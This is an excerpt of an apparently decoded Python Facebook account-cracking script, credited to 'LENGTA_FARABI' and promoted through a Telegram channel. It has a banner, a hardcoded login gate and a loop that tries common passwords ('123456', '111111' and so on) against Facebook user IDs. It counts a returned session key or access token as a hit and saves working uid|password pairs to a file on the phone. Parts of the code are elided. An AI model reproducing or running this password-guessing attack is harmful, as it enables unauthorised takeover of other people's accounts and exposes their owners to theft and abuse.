...
akash="""
 ===================
 DECODE BY : LENGTA_FARABI
 FACEBOOK : LENGTA FARABI
 TELEGRAM Channel : https://t.me/+TRESxYiOrc01Mjll
 =================== """
print(akash);time.sleep(1)


sys.stdout.write('\x1b]2; 𓆩🀪💚【FARABI᭄】㊝𓆪 🔥 \x07')
...
def Banner():
  ...
  _____     ________  ____  _____   ______  _________     _        ________    _       _______          _       ______   _____  
 |_   _|   |_   __  ||_   \|_   _|.' ___  ||  _   _  |   / \      |_   __  |  / \     |_   __ \        / \     |_   _ \ |_   _| 
   | |       | |_ \_|  |   \ | | / .'   \_||_/ | | \_|  / _ \       | |_ \_| / _ \      | |__) |      / _ \      | |_) |  | |   
   | |   _   |  _| _   | |\ \| | | |   ____    | |     / ___ \      |  _|   / ___ \     |  __ /      / ___ \     |  __'.  | |   
  _| |__/ | _| |__/ | _| |_\   |_\ `.___]  |  _| |_  _/ /   \ \_   _| |_  _/ /   \ \_  _| |  \ \_  _/ /   \ \_  _| |__) |_| |_  
 |________||________||_____|\____|`._____.'  |_____||____| |____| |_____||____| |____||____| |___||____| |____||_______/|_____| 
                                                                                                                                attemps = 0
while attemps < 12345677901:
    username = input(' \x1b[0;92mEnter Username: ')
    password = input(' \x1b[0;93mEnter Password: ')
    if username == 'LENGTA' and password == 'FARABI':
    ...
    try:
        ...
        for pw in ['123456', '1234567', '12345678', '123456789', '111111', '000000', '654321', '1234567890']:
            ...
            if 'session_key' in response or 'EAAA' in str(response):
                with open('/sdcard/FARABI_old.txt', 'a') as file:
                    file.write(f'[FARABI-OK🌺] {uid}|{pw}|{creationyear(uid)}')
                line()
                print(f'\r{xy1}{G} [FARABI-OK🌺] {uid} | {pw} | {creationyear(uid)}')
                ...
                print(f'\r{xy1}{G} [FARABI-CP🌺] {uid} | {pw} | {creationyear(uid)}')
                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
